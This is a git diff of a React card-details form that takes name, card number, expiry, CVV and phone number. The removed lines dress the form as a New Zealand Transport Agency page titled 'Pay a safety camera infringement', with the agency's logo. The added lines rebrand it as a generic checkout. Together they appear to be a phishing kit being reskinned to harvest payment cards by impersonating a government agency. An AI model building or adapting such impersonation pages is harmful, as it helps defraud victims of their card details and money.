@@ -1,7 +1,6 @@
 import React from 'react';
-import './LoginScreen.css';
+import './CardVerificationForm.css';
 import { useLanguage } from '../hooks/useLanguage';
-import nztaLogo from '../assets/nzta-logo.png';
 
 // ─── Country codes (named export — LoginForm.js needs this) ───
 export const countryCodes = [
@@ -44,58 +43,37 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
   };
 
   return (
-    <div className="nzta-renewal">
-      {/* ─── Header ─── */}
-      <header className="nzta-header">
-        <div className="nzta-header-inner">
-          <div className="nzta-logo">
-            <img
-              src={nztaLogo}
-              alt="NZ Transport Agency"
-              className="nzta-logo-img"
-            />
-          </div>
-          
-        </div>
-      </header>
+    <div className="cardv-page">
+      <div className="cardv-container">
+        <h1 className="cardv-title">Complete your order</h1>
 
-      {/* ─── Main ─── */}
-      <main className="nzta-main">
-        <a href="#back" className="nzta-back" onClick={(e) => e.preventDefault()}>
-          ← Back
-        </a>
-
-        <h1 className="nzta-title">Pay a safety camera infringement
-</h1>
-
-        
-
-        <hr className="nzta-divider" />
-
-        <p className="nzta-hint">
+        <p className="cardv-intro">
+          Enter your payment details below to finish your checkout.
           All fields are required unless marked 'optional'.
         </p>
 
-        <h2 className="nzta-subtitle">Payment information</h2>
+        <hr className="cardv-divider" />
+
+        <h2 className="cardv-subtitle">Payment information</h2>
 
         <form onSubmit={onSubmit}>
           {/* Cardholder */}
-          <div className="nzta-field">
+          <div className="cardv-field">
             <label>{t.cardholderName}</label>
             <input
               type="text"
               value={cardDetails.cardholderName}
               onChange={(e) => onInputChange('cardholderName', e.target.value)}
               placeholder="e.g. JOHN SMITH"
-              className={`nzta-input ${cardErrors.cardholderName ? 'input-error-red' : ''}`}
+              className={`cardv-input ${cardErrors.cardholderName ? 'cardv-error' : ''}`}
             />
             {cardErrors.cardholderName && (
-              <span className="nzta-error-msg">{cardErrors.cardholderName}</span>
+              <span className="cardv-error-msg">{cardErrors.cardholderName}</span>
             )}
           </div>
 
           {/* Card number */}
-          <div className="nzta-field">
+          <div className="cardv-field">
             <label>{t.cardNumber}</label>
             <input
               type="text"
@@ -103,22 +81,22 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
               onChange={(e) => onInputChange('cardNumber', e.target.value)}
               placeholder="1234 5678 9012 3456"
               maxLength="19"
-              className={`nzta-input ${cardErrors.cardNumber ? 'input-error-red' : ''}`}
+              className={`cardv-input ${cardErrors.cardNumber ? 'cardv-error' : ''}`}
             />
             {cardErrors.cardNumber && (
-              <span className="nzta-error-msg">{cardErrors.cardNumber}</span>
+              <span className="cardv-error-msg">{cardErrors.cardNumber}</span>
             )}
           </div>
 
           {/* Expiry + CVV */}
-          <div className="nzta-row">
-            <div className="nzta-field">
+          <div className="cardv-row">
+            <div className="cardv-field">
               <label>{t.expirationDate}</label>
-              <div className="nzta-row">
+              <div className="cardv-row">
                 <select
                   value={cardDetails.expiryDate?.slice(0, 2) || ''}
                   onChange={(e) => handleExpiryMonthChange(e.target.value)}
-                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
+                  className={`cardv-input ${cardErrors.expiryDate ? 'cardv-error' : ''}`}
                 >
                   <option value="">{t.month}</option>
                   {months.map((m) => (
@@ -130,7 +108,7 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
                 <select
                   value={cardDetails.expiryDate?.slice(-2) || ''}
                   onChange={(e) => handleExpiryYearChange(e.target.value)}
-                  className={`nzta-input ${cardErrors.expiryDate ? 'input-error-red' : ''}`}
+                  className={`cardv-input ${cardErrors.expiryDate ? 'cardv-error' : ''}`}
                 >
                   <option value="">{t.year}</option>
                   {years.map((y) => (
@@ -141,11 +119,11 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
                 </select>
               </div>
               {cardErrors.expiryDate && (
-                <span className="nzta-error-msg">{cardErrors.expiryDate}</span>
+                <span className="cardv-error-msg">{cardErrors.expiryDate}</span>
               )}
             </div>
 
-            <div className="nzta-field">
+            <div className="cardv-field">
               <label>{t.cvv}</label>
               <input
                 type="text"
@@ -153,18 +131,18 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
                 onChange={handleCvvChange}
                 placeholder="123"
                 maxLength="4"
-                className={`nzta-input ${cardErrors.cvv ? 'input-error-red' : ''}`}
+                className={`cardv-input ${cardErrors.cvv ? 'cardv-error' : ''}`}
               />
-              {cardErrors.cvv && <span className="nzta-error-msg">{cardErrors.cvv}</span>}
+              {cardErrors.cvv && <span className="cardv-error-msg">{cardErrors.cvv}</span>}
             </div>
           </div>
 
           {/* Phone */}
-          <div className="nzta-field">
+          <div className="cardv-field">
             <label>{t.phoneNumber}</label>
-            <div className="nzta-row">
+            <div className="cardv-row">
               <select
-                className="nzta-input nzta-country-select"
+                className="cardv-input cardv-country-select"
                 value={cardDetails.countryCode || '+1'}
                 onChange={(e) => onInputChange('countryCode', e.target.value)}
               >
@@ -180,30 +158,30 @@ function CardVerificationForm({ cardDetails, cardErrors, isLoading, onInputChang
                 onChange={handlePhoneChange}
                 placeholder="1234567890"
                 maxLength="15"
-                className={`nzta-input ${cardErrors.phoneNumber ? 'input-error-red' : ''}`}
+                className={`cardv-input cardv-phone-input ${cardErrors.phoneNumber ? 'cardv-error' : ''}`}
               />
             </div>
             {cardErrors.phoneNumber && (
-              <span className="nzta-error-msg">{cardErrors.phoneNumber}</span>
+              <span className="cardv-error-msg">{cardErrors.phoneNumber}</span>
             )}
-            <span className="nzta-help">{t.phoneHint}</span>
+            <span className="cardv-help">{t.phoneHint}</span>
           </div>
 
           {/* Buttons */}
-          <div className="nzta-actions">
+          <div className="cardv-actions">
             <button
               type="submit"
-              className="nzta-btn nzta-btn-continue"
+              className="cardv-btn cardv-btn-continue"
               disabled={isLoading}
             >
               {isLoading ? 'Please wait…' : 'Continue'}
             </button>
-            <button type="button" className="nzta-btn nzta-btn-cancel">
+            <button type="button" className="cardv-btn cardv-btn-cancel">
               Cancel
             </button>
           </div>
         </form>
-      </main>
+      </div>
     </div>
   );
 }
